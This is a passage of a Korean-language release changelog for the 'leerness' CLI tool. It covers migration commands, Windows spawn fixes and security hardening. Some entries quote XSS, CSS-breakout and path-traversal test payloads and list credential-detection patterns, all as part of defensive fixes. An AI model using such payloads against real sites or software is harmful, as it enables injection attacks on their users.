나머지 `arg('--path',cwd)` 명령(verify-claim/deps/persona/review 등 — positional 이 path 아닌 인자)은 그대로 두되, --path 등호형은 이제 전체 동작. CV-4(멱등/retention)·CV-5(selftest 행위화 추가)·CV-6(스캐너 FP/FN)·CV-7(help registry) 후속.

## 1.9.360 — 2026-06-05 — 안정화① 외부리뷰 CV-2: fetchNpmLatest 신형 Node Windows EINVAL 회피 (UR-0077)

**🛠 외부 멀티모델 리뷰(1.9.359) 안정화 시리즈 1탄.** `update --check` 가 신형 Node Windows 에서 `spawn EINVAL` 로 실패하던 회귀를 수정. (Codex+Sonnet 교차검증 + 자체 재현 Node v26.3.0)

### 배경 — 외부 리뷰 CV-2 (P1, 2/3 모델 + 자체 재현)
Node 18.20.2+/20.12.2+/21.7.3+/22+/26 은 `shell:true` 없이 `.cmd` 파일을 spawn 하면 `EINVAL` 을 던진다(CVE-2024-27980 수정 부작용). UR-0066(1.9.352)이 셸 주입 표면 제거를 위해 `npm.cmd` 를 직접 `execFile` 하도록 바꾼 것이 이 환경에서 회귀를 유발 → `update --check` 무력화. 게다가 init 이 SessionStart hook 으로 `update --check` 를 기본 설치하므로 **매 세션 `✗ spawn EINVAL`** 가 출력됐다. 자체 재현: Node v26.3.0 에서 `update --check` → `✗ spawn EINVAL`.

### 구현
1. **`fetchNpmLatest` win 경로 교체**: `npm.cmd` 직접 execFile → **`cmd.exe /d /s /c npm view <pkg> version`**. cmd.exe 는 `.exe` 라 EINVAL 없음, `shell:true` 미사용이라 DEP0190(deprecation) 도 회피. pkg 는 charset 검증(메타문자 0)이라 cmd 주입 불가.
2. **동기 throw 흡수**: execFile 동기 EINVAL throw 를 `try/catch` 로 `resolve(null)` (이전엔 Promise reject 누수).

### 검증 (회귀 0)
- **selftest 106→107 PASS** (UR-0040/UR-0066 케이스를 cmd.exe args 형태로 갱신 + CV-2 EINVAL 회피 가드 추가). **E2E 304→305 PASS** (행위 가드: `update --check` 가 EINVAL 없이 exit 0).
- 실측: 수정 후 `update --check` → `npm leerness latest: 1.9.360 → up to date` (EINVAL 소멸).

## 1.9.359 — 2026-06-05 — UR-0074: install-safety — 설치 안전 프로필 투명 공개 (공급망 신뢰)

**🧩 `leerness install-safety` — 0 런타임 의존성 · 0 install-time 스크립트라는 핵심 안전 속성을 사실 그대로 보고 + 안전 설치 워크플로 안내. 외부리뷰 "설치/릴리스 신뢰성" 우려 선제 대응.** (UR-0074, 안정화 배포 직전)

### 배경
GPT-5.5 웹 리뷰(UR-0074)가 "릴리스 케이던스 과다 + 설치 안전성"을 지적하며 `npm_config_ignore_scripts=true` + branch+diff 워크플로를 권고했다. leerness 는 이미 **런타임 의존성 0 · install-time 스크립트 0**(공급망 노출 0)이므로, 이 사실을 투명하게 공개하는 것이 신뢰의 핵심이다. 곧 이어질 안정화 배포의 신뢰 근거이기도 하다.

### 구현
1. **`installSafetyCmd(opts)`**(신규) + **`leerness install-safety [--json]`**: 패키지 `package.json` 을 읽어 `runtimeDeps`(0) · `installScripts`(preinstall/install/postinstall 0) · `node` engines · offline-first 여부 + 안전 설치 4단계(branch → ignore-scripts `migrate plan`(읽기전용 비교) → `update --yes` → `git diff`) 보고.
2. **회귀 가드 겸용**: selftest + e2e 가 `runtimeDeps===0 && hasInstallScripts===false` 를 단언 — 누군가 런타임 deps/install hook 를 추가하면 테스트가 실패시켜 **의식적 결정을 강제**(공급망 안전 회귀 방지).

### 검증
- **selftest 105→106 PASS** · **E2E 303→304 PASS** (회귀 0).
- 실측: `--json` → `runtimeDeps:0, hasInstallScripts:false, node:">=18", safeInstall:4단계`. human 출력 정상.

## 1.9.358 — 2026-06-05 — UR-0075 Phase D: migrate plan — 임시폴더 설치 후 비교 마이그레이션 플랜 (umbrella 완결)

**🧩 `leerness migrate plan` — 임시폴더에 현재 버전을 설치한 뒤 프로젝트의 .harness 코어 파일과 비교해 정확한 마이그레이션 플랜을 산출. 읽기 전용. UR-0075 마이그레이션 umbrella 완결.** (UR-0075 Phase D)

### 배경
사용자 비전: "임시 폴더에 leerness 설치 후 기존 프로젝트의 내용을 정확하게 마이그레이션." Phase A(가이드)·B(audit 진단)·C(apply 적용)에 이어, Phase D는 그 비전의 핵심인 **임시폴더 설치 기반 정밀 비교**를 구현한다. 임시폴더에 현재 버전을 실제로 설치(서브프로세스 격리)해 "최신 버전이 생성하는 관리 파일 집합"을 확보하고, 프로젝트의 현재 파일과 비교해 누락 파일을 정확히 식별한다.

### 구현
1. **`migratePlanCmd(root, opts)`**(신규) + **`leerness migrate plan [--path <p>] [--json]`**:
   - **임시폴더 설치**: `mkdtempSync` → `cp.spawnSync(node, [harness, init, <tmp>, --yes, --language <projlang>, --no-banner])` (서브프로세스 격리 — stdout 미오염, 부작용 격리). e2e 검증 패턴 재사용.
   - **비교**: 임시폴더 `.harness` 코어 파일(depth-1) + `AGENTS.md`/`CLAUDE.md` 중 프로젝트에 **없는** 파일 → `missing-file`.
   - **통합**: `version-drift`(compareVer) + `canonical-pending`(decisions/lessons MD-without-JSON) 합산.
2. **완전 읽기 전용**: 프로젝트 미변경 — 임시폴더만 사용 후 `rmSync` 자동 정리.
3. `--json`: `{ projectVersion, versionDrift, canonicalPending[], missingFiles[], tempInstallOk, willChange }`. 각 finding 에 적용 명령 안내(`update --yes` / `migrate apply --yes`).

### 검증
- **selftest 104→105 PASS** · **E2E 302→303 PASS** (회귀 0).
- 실측: clean → `willChange:0` `tempInstallOk:true`. 코어 파일(reuse-map.md) 삭제 → `missingFiles` 에 정확 감지 · `willChange:1`. 플랜 실행 후 프로젝트 미변경(읽기 전용 확인).

### UR-0075 umbrella 완결
Phase A(가이드) · B(audit 진단) · C(apply 적용) · **D(plan 임시폴더 비교)** 4단계 완료. 크로스버전 마이그레이션 워크플로: `migrate plan`(진단) → `migrate apply --yes`(canonical) / `update --yes`(버전) → `migrate audit`(재확인).

## 1.9.357 — 2026-06-05 — UR-0075 Phase C: migrate apply — canonical 백필 비파괴 적용

**🧩 `leerness migrate apply` — `migrate audit` 가 찾은 '안전 항목'(canonical 백필)만 실제로 적용하는 실행 짝. 기본 dry-run, `--yes` 로 적용, 멱등.** (UR-0075 Phase C)

### 배경
Phase B(`migrate audit`)는 무엇이 어긋났는지 **진단(읽기 전용)** 만 했다. Phase C는 그중 **안전하게 자동 적용 가능한 항목**(canonical-pending: MD-only → canonical JSON 백필)을 실제로 처리한다. version-drift(npm 재설치 필요)·missing-file(재초기화 필요)는 in-place 자동 처리가 안전하지 않으므로 apply 범위에서 제외하고 수동 안내만 한다.

### 구현
1. **`migrateApplyCmd(root, opts)`**(신규) + **`leerness migrate apply [--path <p>] [--json] [--yes]`**:
   - **canonical-pending** → `_loadX(root)`(MD 백필) → `_saveX(root, arr)`(canonical JSON + MD 정규화). UR-0053/0058 라운드트립이라 **멱등**(재실행 시 변경 0).
   - **version-drift / missing-file** → apply 범위 외 → "수동 필요"로 분류 + 조치 명령 안내(`update --yes` / `migrate`).
2. **기본 dry-run(비파괴)** — `--yes` 없으면 변경 0, "적용 예정" 만 표시(전역 지침 "Dry-run 기본" 준수). `--yes` 시에만 실제 백필.
3. `--json`: `{ dryRun, appliedCount, applied:[], skipped:[] }` 구조화 출력.

### 검증
- **selftest 103→104 PASS** · **E2E 301→302 PASS** (회귀 0).
- 실측: dry-run → `decisions.json` 미생성(비파괴). `--yes` → 생성. 재실행 → `applied 0`(멱등). clean → "적용할 항목 없음".

## 1.9.356 — 2026-06-05 — UR-0075 Phase B: migrate audit — 비파괴 스키마 drift 리포트

**🧩 `leerness migrate audit` — 임시설치/변형 없이 프로젝트의 마이그레이션 필요 항목만 진단하는 비파괴 dry-run 리포트.** (UR-0075 Phase B — Phase A 가이드 다음 단계)

### 배경
Phase A 가이드는 AI 에이전트에게 "무엇을 해야 하는가"의 워크플로를 제공했으나, 실제 프로젝트가 **무엇이 어긋나 있는지**(버전 drift / canonical JSON 미생성 / 필수 파일 누락)는 사람이/AI가 수동 확인해야 했다. Phase B는 그 진단을 한 명령으로 자동화한다 — 임시설치·파일변형 없이(완전 비파괴) 읽기만으로.

### 구현
1. **`migrateAuditCmd(root, opts)`**(신규) + **`leerness migrate audit [--path <p>] [--json]`** — 3종 finding 감지:
   - **version-drift**: `.harness/HARNESS_VERSION`(또는 추정) vs 도구 VERSION `compareVer` 비교 — 구버전 프로젝트 식별.
   - **canonical-pending**: `decisions.md`/`lessons.md` 에 항목이 있으나 대응 `.json`(canonical) 부재 — UR-0053/0058 canonical 백필 대상.
   - **missing-required**: `verify()` 필수 파일 매니페스트(9종) 대비 누락 파일.
2. **완전 비파괴(dry-run)**: 읽기 전용 — `.json` 생성/파일 변형 없음. `--json` 은 `{projectVersion, toolVersion, willChange, findings:[{kind,detail,...}]}` 구조화 출력, 사람용은 항목별 권장 조치 안내.
3. **clean 프로젝트**: `willChange:0` + "마이그레이션 필요 없음 — 최신 스키마 정합".

### 검증
- **selftest 102→103 PASS** · **E2E 300→301 PASS** (회귀 0).
- 실측: clean init → `willChange:0`. 구버전(HARNESS_VERSION 1.9.6) + `decisions.md`(json 삭제) → `willChange:2` `version-drift,canonical-pending`. dry-run 후 `decisions.json` 미생성(비파괴 확인).

## 1.9.355 — 2026-06-05 — UR-0075 Phase A: 크로스버전 마이그레이션 가이드 + migrate/update --path

**🧩 AI 에이전트용 크로스버전 마이그레이션 가이드(`migrate --guide`) + init/migrate/update `--path` 지원.** (UR-0075 Phase A — 비전 착수, 외부리뷰 버그 전량 해소 후)

### 배경
외부리뷰 P0~P3 전량 해소로 안전 기반 마련 → 비전 착수. 마이그레이션은 leerness 핵심 가치("비파괴 마이그레이션"). 가이드가 `update --path`/`migrate --path` 를 권하므로 정확성 위해 --path 지원을 함께 보강(UR-0059 확장).

### 구현
1. **`_migrationGuideText(version)`**(순수) + **`leerness migrate --guide`/`migrate guide`** — AI 에이전트용 안전 워크플로: 안전 스냅샷(git) → `npx leerness@latest update --check --path <project>`(감지) → `--yes`(임시설치·.harness/archive 백업·신 스키마) → `git diff`/`selftest`/`check` 검증 → canonical JSON 백필 메모 → 롤백.
2. **init/migrate/update `--path` 지원** (UR-0059 확장): `install(arg('--path', args[1] || cwd))` / `updateCmd(arg('--path', ...))` — 이전엔 `args[1] || cwd` 로 positional 전용·`--path` 무시. 이제 --path > positional > cwd. (가이드의 `update --path` 정확성)

### 검증
- **selftest 102/102 PASS** · **E2E 299→300 PASS** (회귀 0).
- 실측: `migrate --guide` 가이드 출력(0.원칙~6.롤백) · `migrate guide` subcommand 동일 · `update --check --path B`(cwd A) → B 의 HARNESS_VERSION(1.9.6) 읽음(=--path 동작, 이전 cwd A).

## 1.9.354 — 2026-06-05 — 외부리뷰 P3 클러스터 (UR-0072) · 외부리뷰 백로그 소진

**🧩 외부 리뷰 P3 핵심 4종 — compareVer pre-release · _classifyCJK 일본어 오판 · scan secrets 파일경로 · requests drop 아이콘.**

### 구현
1. **compareVer pre-release** (Opus P3-4): `1.9.0-beta` < `1.9.0` semver 규칙 적용(이전: `-beta` 무시 → 동일 취급). beta/next 채널 stale-check 정확도.
2. **_classifyCJK 일본어 오판** (Opus P3-2): CJK 통합 한자(한·중·일 공유)를 무조건 중국어로 세던 것 → **kana 존재 시 일본어 귀속** 휴리스틱. advisory 인코딩 라벨 정확도.
3. **scan secrets 파일경로** (Codex#10): `scan secrets <file>` 가 `ENOTDIR` 로 실패하던 것 → 파일이면 그 파일만 스캔(basename 표시), 디렉토리면 walk.
4. **requests drop 아이콘** (Codex#8): 성공 동작에 실패 아이콘 `✗` → `✓`.

### 검증
- **selftest 101/101 PASS** · **E2E 298→299 PASS** (회귀 0).
- 실측: compareVer beta<release · _classifyCJK 일본어(kana+한자)→japanese·중국어(한자만)→chinese · `scan secrets leak.js` GitLab PAT 감지(ENOTDIR 없음, leak.js 표시) · `requests drop` → ✓.

### 비고 (P3 잔여 — cosmetic, UR-0072 후속)
intent/constraints/requests `.` arg "Unknown subcommand"(핸들러별 default 검증 필요) · skill install <catalog-id>(id 해석 설계) · pulse 라벨 분모 표기 — 소형 UX 폴리시, 별도 처리.

## 1.9.353 — 2026-06-05 — 외부리뷰 P2 마무리 3종 (UR-0067/0070/0071) · P2 전량 완료

**🧩 외부 리뷰 남은 P2 3건 — 인코딩 정책/CP949 · shell-guard 셸 명시 · init non-TTY ANSI. 외부리뷰 P0/P1/P2 전량 해소.**

### 구현
1. **UR-0067 — 인코딩 정합** (Opus P2-1/Codex#4): (a) `encoding check` 의 UTF-8 BOM 경고를 `.ps1`/`.bat` 예외 — PS5.1 호환 위해 BOM 이 의도적일 수 있어 `env encoding`(BOM 권장)과의 모순 해소. (b) 한글(`[가-힣]`) 게이트 제거 → **CP949/Latin-1 등 invalid UTF-8 을 round-trip 불일치로 감지**(이전: 한글 없으면 통과 = false negative). 유효 UTF-8 은 byte-exact round-trip 이라 오탐 0.
2. **UR-0070 — shell-guard 셸 명시** (Opus P2-4): `--shell powershell|cmd|bash` (+ `--ps-version`) 옵션 — 자동 감지(git-bash 경유 등)가 실제 실행 셸과 달라 PS5.1 `&&` 가드가 무력화되던 문제. AI 에이전트가 대상 셸 지정 가능.
3. **UR-0071 — init non-TTY ANSI** (Sonnet F-05): init 완료 안내 5개 raw ANSI(`\x1b[36m/33m/2m`)에 isTTY 가드 — 파이프 출력에 raw escape 누출 방지.

### 검증
- **selftest 100/100 PASS** · **E2E 297→298 PASS** (회귀 0).
- 실측: cp949.txt(한글 utf8 미매치) invalid 감지 + script.ps1 BOM 예외 · `shell-guard "a && b" --shell powershell` → ps5-chain 감지 · init 파이프 출력 raw ANSI 0.

## 1.9.352 — 2026-06-05 — 외부리뷰 P2 정리 3종 (UR-0066/0068/0069)

**🧩 외부 리뷰 P2 3건 — shell:true 주입 가드 + milestone 파서 누출 + usage subcommand 미집계.** (selftest 100 달성)

### 구현
1. **UR-0066 — shell:true 주입 가드** (Opus P2-3/Sonnet F-12): `agents bench|multi --execute` 가 raw task 를 `shell:true` spawn 에 전달 → 셸 메타문자(`& | $()` 백틱) 주입 위험. task 를 `_shellQuoteArg`(크로스플랫폼)로 단일 토큰화(안전 경로 `_cliChat` 와 일관). `fetchNpmLatest` 의 `shell:true` → win `npm.cmd` 직접 호출로 셸 표면 제거.
2. **UR-0068 — milestone 파서 누출** (Codex#5): `_roadmapParseMilestones` 가 `slice(m.index)` 로 다음 milestone 의 Status/Progress 를 이전에 적용하던 버그. **다음 milestone 직전까지 block 한정**.
3. **UR-0069 — usage subcommand 미집계** (Codex#6): usage 루트가 `args[1]` 을 path 로 가정 → `decision add`/`scan secrets` 등 subcommand 명령에서 `root=cwd/add` 가 되어 .harness 못 찾아 미집계. 루트를 `arg('--path', cwd)` 로 수정(전 명령 집계).

### 검증
- **selftest 100/100 PASS** · **E2E 296→297 PASS** (회귀 0).
- 실측: milestone M-0001 status=planned(누출 없음)/M-0002 done · `_shellQuoteArg('a & b')` 단일 토큰화 · decision/lesson/scan 각 usage 1 집계(이전 0) · 기존 UR-0040 fetchNpmLatest selftest 케이스 새 npm.cmd 형태로 갱신.

## 1.9.351 — 2026-06-05 — 외부리뷰 UR-0064/0065: 제목 오염 차단 + 문서 정합

**🧩 외부 리뷰 남은 P1 2건 — decision/lesson 제목 오염 차단 + 문서 정합(AGENTS.md/--help). 외부리뷰 P0/P1 전량 해소.**

### 구현
1. **UR-0064 — 제목/텍스트 오염 차단** (Sonnet F-02): `decision add "T" --reason "R" /path` 처럼 `--flag value` 가 nonFlagArgs 로 제거된 뒤 남는 **경로형 positional** 이 title/text 에 흡수되던 문제. titleParts/textParts 루프가 절대/상대 경로 패턴(`C:\`, `/`, `./`, `../`)에서 break.
2. **UR-0065 — 문서 정합** (Sonnet F-04 + Codex#7):
   - **AGENTS.md** `.leerness/` 모호성 해소 — 동적 상태(결정/교훈/계획/진행/인수인계)는 **기본 워크스페이스 `.harness/`** 에 기록됨을 명시. `leerness state` JSON substrate(`.leerness/`)는 별개(선택)임을 구분.
   - **--help** 누락 명령 보강: context/health/doctor/pulse/milestones/round-history/decision/lesson/intent/constraints/requests/skill install/discover.

### 검증
- **selftest 98/98 PASS** · **E2E 295→296 PASS** (회귀 0).
- 실측: `decision add "PG 채택" --reason "관계형" /abs/leak` → title="PG 채택"(경로 미흡수) · lesson save 동일 · 생성 AGENTS.md ".harness 메인 + state substrate 별개" 명시 · `--help` 가 이전 누락 10+ 명령 노출.

## 1.9.350 — 2026-06-05 — 외부리뷰 P1 보안 하드닝 3종 (UR-0060/0061/0062)

**🔒 외부 멀티모델 리뷰 P1 보안 3건 일괄 수정 — 자율 팀(UR-0073) 전 보안 기반 다지기.**

### 구현
1. **UR-0062 — skill install path traversal 차단** (Codex#2): `SKILL.md name: ..` 가 `.harness/skills/<id>` 밖에 쓰이던 문제. id 정규화에 선행/후행 `./-` 제거 + `..` 거부 + jail(`dir.startsWith(skillsRoot+sep)`).
2. **UR-0061 — roadmap CSS 인젝션 차단** (Codex#3+Opus P3-1, 2모델): design token 값이 `_roadmapTokenStyles` 의 `:root{}` 에 raw 보간 → `}`/`</style>` breakout. CSS 값 whitelist 살균(`[^#a-zA-Z0-9(),.%\s_-]` 제거)으로 규칙/태그 탈출 차단, 색상/길이 보존.
3. **UR-0060 — 시크릿 스캐너 보강** (3모델): (a) 파일명 substring(`harness.js`/`secret-policy.md`) skip → **정확 경로** self-exclusion(`path.resolve(file)===__filename` + 생성 secret-policy 템플릿만) — 사용자 파일명 false-negative 제거. (b) SECRET_PATTERNS 13→**19**: GitLab PAT / JWT / DB-URI(임베디드 비밀번호) / SendGrid / AWS Secret Access Key(context) / Bearker 토큰 보강.

### 검증
- **selftest 98/98 PASS** · **E2E 295/295 PASS** (회귀 0).
- 실측: skill `name: ..` → "path traversal 차단"(`.harness/SKILL.md` 미생성) · 사용자 `harness.js` 의 GitLab PAT **이제 탐지**(false-neg 해소) · CSS `red;}</style><script>` → `<`/`>`/`}` 제거(breakout 차단)·`#2563eb` 보존 · 신규 6패턴 탐지 + clean(john_doe/example.com URL) 오탐 0.

## 1.9.349 — 2026-06-05 — 외부리뷰 UR-0063: selftest/doctor 위치독립화 (trust-killer)

**🔴 신규 사용자 첫인상 신뢰 직결 버그 수정 — `selftest`/`doctor` 가 비초기화 디렉토리에서 거짓 "설치 손상 → 재설치" 오보고하던 문제 해소.** (Opus 4.8 P1-1 + 웹 GPT-5.5 "가장 치명적" + 하네스 재현 = **3모델 교차검증**)

### 배경
`init 가드` selftest 케이스(UR-0047 1.9.311)가 `_isInitialized('.')===true` 를 검사 → cwd 가 init 프로젝트가 아니면 거짓 실패. `selftest`/`doctor`/`npm run test:fast`/smoke 가 신규 사용자의 임의 디렉토리에서 "1/N 실패 — 설치 손상 의심 / 재설치" 출력 → 첫 진단이 정상 설치를 broken 으로 오인. GPT-5.5 신뢰도 4/10·프로덕션 3/10 의 핵심 원인. **자가진단은 cwd 상태에 의존하면 안 됨.**

### 구현
1. selftest 케이스의 cwd 의존 `liveOk = _isInitialized('.')` → **위치독립 임시 fixture**: `os.tmpdir()` 에 AGENTS.md 마커 생성 후 `_isInitialized(fixture)===true` 검증 + 정리(finally). 비초기화 탐지(`emptyOk`)는 유지.
2. doctor 는 selftest 를 인라인 실행 → 동일 수정으로 함께 해소.

### 검증
- **비초기화 dir selftest 96/96 통과**(이전 1/96 실패) · **doctor "✓ 설치 정상"**(이전 "✗ 문제 감지 — 재설치") · init dir 회귀 96/96 OK.
- selftest 96/96 · **E2E 293→294 PASS**(비초기화 cwd selftest/doctor 회귀 가드 추가, 회귀 0).

## 1.9.348 — 2026-06-05 — 외부리뷰 UR-0059(P0): --path 라우팅 일관화

**🔴 외부 멀티모델 리뷰 P0 수정 — `--path` 플래그가 ~22개 positional-dispatch 명령에서 무시되고 CWD 로 fallback 되던 버그 해소.** (Sonnet 4.8 F-01 발견, 하네스 재현 검증)

### 배경
`nonFlagArgs()` 가 `--path <value>` 쌍을 제거 → `roadmapCmd(args[1] || process.cwd())` 류 22개 dispatch 가 `--path` 를 무시하고 CWD/positional 로 fallback. CWD 에 `.harness` 가 있으면 silent wrong-target(타 프로젝트 데이터 읽기/쓰기). 영속 팀(올바른 프로젝트 타깃팅, UR-0073)의 전제조건.

### 구현
1. 22개 dispatch 사이트 `(args[N] || process.cwd())` → `(arg('--path', args[N] || process.cwd()))` 일괄 — **--path 우선 → positional → cwd** 정합. (128개 `arg('--path')` 사이트와 일관화)
2. 영향 명령: status/verify/debug/audit/check/handoff/reuse-map/gate/verify-code/retro/insights/roadmap/graph(args[1]) + auto-update install/scan secrets/encoding check/self check/readme sync/consistency/ui consistency/setup-agents(args[2]).
3. selftest 95→96 · e2e 292→293.

### 검증
- **selftest 96/96 PASS** · **E2E 293/293 PASS** (회귀 0).
- 재현 해소 실측: A(cwd)에서 `handoff --path B` → **B 데이터 사용**(이전: A) · positional `handoff B` → B(회귀 OK) · `handoff`(무인자) → A cwd(회귀 OK) · `scan secrets --path B`(args[2] 패턴) 정상.

## 1.9.347 — 2026-06-05 — UR-0025(심층): _parseSkillMd 순수 파서 분리

**🧩 SKILL.md frontmatter 파서(`_parseSkillMd`, BOM-aware)를 lib/pure-utils.js 로 분리 — 순수함수 추출 3번째. 스킬 설치/임포트의 사용자 입력 파싱(Windows Notepad BOM 호환).** (UR-0025 심층)

### 구현 (UR-0025 심층 — 순수함수)
1. **`_parseSkillMd(text)`**(SKILL.md → `{meta, body}`, frontmatter `---...---` 파싱 + BOM strip + 따옴표 제거, 모듈 의존 0) → `lib/pure-utils.js`. harness 2개 사용처(skill discover/install)는 import 바인딩 사용.
2. selftest 94→95 · e2e 291→292.

### 검증
- **selftest 95/95 PASS** · **E2E 292/292 PASS** (회귀 0).
- 실측: frontmatter name/description(따옴표 제거) · body 분리 · **BOM-aware**(선행 U+FEFF strip) · no-frontmatter→`{meta:{}, body:원문}` · null-safe · **skill install end-to-end**: BOM 포함 SKILL.md → `e2e-skill/SKILL.md` 정상 설치.

## 1.9.346 — 2026-06-05 — UR-0025(심층): _roadmapTokenStyles 순수함수 분리

**🧩 roadmap.html `:root` CSS 변수 빌더(`_roadmapTokenStyles`)를 lib/pure-utils.js 로 분리 — 순수함수 추출 2번째. + null-safe 가드 보강.** (UR-0025 심층)

### 구현 (UR-0025 심층 — 순수함수)
1. **`_roadmapTokenStyles(designTokens, cssVariables)`**(design token + CSS var → `:root { --lr-* }` CSS 문자열, 모듈 의존 0) → `lib/pure-utils.js`. `_roadmapLayout` 은 ROADMAP_NODE_* 상수를 `_roadmapHTML` 과 공유(entangled)라 harness 유지.
2. 추출 시 **null-safe 가드 보강**(`designTokens||{}`, `cssVariables||{}`) — 기존 동작 동일, 견고성 향상.
3. selftest 93→94 · e2e 290→291.

### 검증
- **selftest 94/94 PASS** · **E2E 291/291 PASS** (회귀 0).
- 실측: `:root` prefix · token→`--lr-primary` · cssVar→`--lr-surface` · custom passthrough(`--lr-custom`) · 기본값(card-bg/edge/page-bg) · null-safe · **roadmap.html end-to-end** `:root`/`--lr-` CSS 주입 정상.

## 1.9.345 — 2026-06-05 — UR-0025(심층): _esc(HTML escape) 순수함수 분리

**🔒 HTML escape 헬퍼(`_esc`)를 lib/pure-utils.js 로 분리 — roadmap.html 출력 인젝션 방지 보안 함수의 단위 테스트화. catalog vein 이후 순수함수 추출 전환 1번째.** (UR-0025 심층)

### 배경
정적 데이터 catalog 15종 분리 완료 → 모듈화의 나머지 절반(순수 함수 추출)으로 전환. `_esc` 는 roadmap.html 의 모든 사용자 입력(task 제목/ID/next-action 등 19개 사이트)을 이스케이프하는 **보안 관련** 순수 함수.

### 구현 (UR-0025 심층 — 순수함수)
1. **`_esc(s)`**(5문자 `& < > " '` → HTML 엔티티, null-safe) → `lib/pure-utils.js`. harness 19개 사용처는 import 된 바인딩 사용(호출 0변경).
2. selftest 92→93 · e2e 289→290.

### 검증
- **selftest 93/93 PASS** · **E2E 290/290 PASS** (회귀 0).
- 실측: 5문자 이스케이프 정확 · XSS 페이로드(`<script>`→`&lt;script&gt;`) · null/undefined→"" · 숫자/평문 보존 · **roadmap.html end-to-end**: 악성 task 제목(`<img src=x onerror=alert(1)>`) 이스케이프 확인(raw 미주입, `&lt;img` 형태).

## 1.9.344 — 2026-06-05 — UR-0025(심층): SKILL_CATALOG_PRESETS 분리 + UR-0057 완료

**🧩 skill discover GitHub preset catalog 를 모듈로 분리 — catalog 추출 vein 마무리(동형 추출 10번째). + UR-0057(anti-laziness 분리, 1.9.336 기구현) 백로그 위생 완료.** (UR-0025 심층)

### 구현 (UR-0025 심층)
1. **`SKILL_CATALOG_PRESETS`**(vercel/anthropic GitHub skill preset) → `lib/catalogs.js`. `skill discover --preset`/`--all-presets` 가 import. catalog 추출 vein 마무리(10번째).
2. **UR-0057 완료**: "anti-laziness subsystem data and pure logic extraction" 은 1.9.336 에서 이미 구현(OPTIMISM_PATTERNS→catalogs 10종 + _detectOptimism/_computeConfidence/_extractUrlClaims/_verifyUrlClaim→pure-utils) — 재검증 후 완료 처리(백로그 위생).
3. selftest 91→92 · e2e 288→289.

### 검증
- **selftest 92/92 PASS** · **E2E 289/289 PASS** (회귀 0).
- 실측: preset 2종(vercel.owner=vercel-labs · anthropic.repo=skills) · `skill discover --preset nonexistent` 가 catalog 기반 사용가능 목록(vercel, anthropic) 노출 · UR-0057 구현 실재 재검증(catalogs 10 + pure-utils 4함수 + harness 정의 부재).

## 1.9.343 — 2026-06-05 — 🎉 R300 마일스톤 · UR-0025(심층): SECRET_PATTERNS 보안 응집 분리

**🎉 R300 누적 라운드 달성 (baseline v1.9.6).** **🔒 시크릿 값 스캔 정규식(13종)을 lib/catalogs.js 로 분리 — 보안 패턴 응집(`_isSecretKey` 키이름 휴리스틱과 모듈 통합). 동형 추출 9번째.** (UR-0025 심층)

### 구현 (UR-0025 심층 — 보안 catalog)
1. **`SECRET_PATTERNS`**(13종 값 탐지 정규식: AWS AKIA/ASIA · GitHub token/PAT · OpenAI proj/svcacct·legacy · Anthropic api03 · Stripe · npm · Google API/OAuth · Slack · private key · 하드코딩 비밀번호) → `lib/catalogs.js`. `scan secrets` 가 import. **스캔 로직은 harness 무수정**(보안 위험 최소화 — catalog-only 이동).
2. 블록 지역 `SECRET_PATTERNS = ['.env',...]`(gitignore 파일명 배열, 4곳)은 동명이지만 별개 — **무손상 보존**(모듈 레벨 const 만 이동).
3. selftest 90→91 · e2e 287→288.

### 검증 (보안 핵심 — 철저)
- **selftest 91/91 PASS** · **E2E 288/288 PASS** (회귀 0).
- 실측: catalog 13종(모두 {name, RegExp}) · `scan secrets` 가짜 AWS AKIA + Anthropic api03 키 **탐지** · clean 파일(john_doe_2024 / example.com URL) **오탐 0**(exit 0) · 지역 .env shadow 4곳 보존.

### 🏛 R300 누적 현황
- catalogs.js **14개 catalog** 분리(capability/powerful/adapters/reuse/constraints/domain/LSP/optimism/persona/STRINGS/builtin-skill/roadmap-label/roadmap-color/secret).
- pure-utils **~46개 순수 함수**. decisions·lessons **canonical JSON 단일 진실소스**. selftest 91 + e2e 288 무결성 게이트. MCP 도구·9 카테고리 CLI.

## 1.9.342 — 2026-06-05 — UR-0025(심층): roadmap status 맵 분리

**🧩 roadmap.html 상태 라벨/색상 맵(각 11키)을 모듈로 분리 — 동형 추출 8번째.** (UR-0025 심층)

### 구현 (UR-0025 심층)
1. **`ROADMAP_STATUS_LABEL`**(status→ko 라벨, 11키) + **`ROADMAP_STATUS_COLOR`**(status→hex 색상, 11키) → `lib/catalogs.js`. roadmap.html 생성기가 import 해서 사용(렌더 로직은 harness 유지 — 인라인 fallback 다양해 박막 강제 안 함).
2. selftest 89→90 · e2e 286→287.

### 검증
- **selftest 90/90 PASS** · **E2E 287/287 PASS** (회귀 0).
- 실측: label/color 각 11키 보존(done=완료/#16a34a · blocked=오류/#dc2626 · skill=#8b5cf6) · `roadmap` 명령 roadmap.html 색상 주입(#16a34a/#8b5cf6) 정상.

## 1.9.341 — 2026-06-05 — UR-0025(심층): BUILTIN_CATALOG 서브시스템 분리

**🧩 내장 스킬 catalog(9종) + 순수 _source 변환을 모듈로 분리 — 동형 추출 7번째.** (UR-0025 심층)

### 배경 (방향 판단)
"rules canonical 로 트리오 완성"을 검토했으나, rules 는 이미 **구조화된 MD 테이블**(`| R-XXXX | trigger | rule | added | status | lastVerified |`)로 `readRules`/`writeRules` round-trip 이 깔끔 → decisions/lessons 의 free-form 블록 drift 부류가 아니고, 6개 변이 명령 + 매세션 자동검증에 쓰이는 행동 핵심이라 변환 위험 대비 가치 낮음 → **보류**(결정매트릭스: 안정성·기존 패턴 우선). 대신 검증된 저위험 catalog 추출 계속.

### 구현 (UR-0025 심층)
1. **`BUILTIN_CATALOG`**(9 내장 스킬: office/commerce-api/crawling/firebase/ads-analytics/appstore-review/ai-verified-skill-publisher/feature-implementation/project-roadmap-generator) → `lib/catalogs.js`.
2. **`_withBuiltinSource(catalog)`**(순수: catalog → `_source:'builtin'` 부여 맵) → `lib/pure-utils.js`. `_loadSkillCatalog` 의 builtin fallback = `_withBuiltinSource(BUILTIN_CATALOG)` 박막. import 가 로드타임 `_loadSkillCatalog()` 호출보다 앞서므로 순서 안전. 긴 단일라인 블록은 일회용 마이그레이션 스크립트로 결정적 이동 후 삭제.
3. selftest 88→89 · e2e 285→286.

### 검증
- **selftest 89/89 PASS** · **E2E 286/286 PASS** (회귀 0).
- 실측: catalog 9종(office.version 보존) · `_withBuiltinSource` 9 entries 전부 _source=builtin·capabilities 보존·null guard({}) · `skill list` 명령 builtin catalog 정상 노출(office/firebase/...).

## 1.9.340 — 2026-06-05 — UR-0058: lessons canonical = JSON, MD = projection (Codex 위임·검증)

